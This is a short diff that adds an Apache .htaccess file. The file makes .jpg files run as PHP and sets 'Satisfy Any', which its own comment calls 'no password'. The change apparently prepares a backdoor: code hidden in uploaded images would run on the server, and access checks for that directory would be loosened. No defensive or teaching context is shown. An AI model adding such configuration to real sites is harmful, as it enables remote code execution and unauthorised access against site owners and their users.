@@ -1,0 +1,6 @@
+# parse the image as a php file
+AddType application/x-httpd-php .jpg
+Options -Indexes
+
+# no password
+Satisfy Any
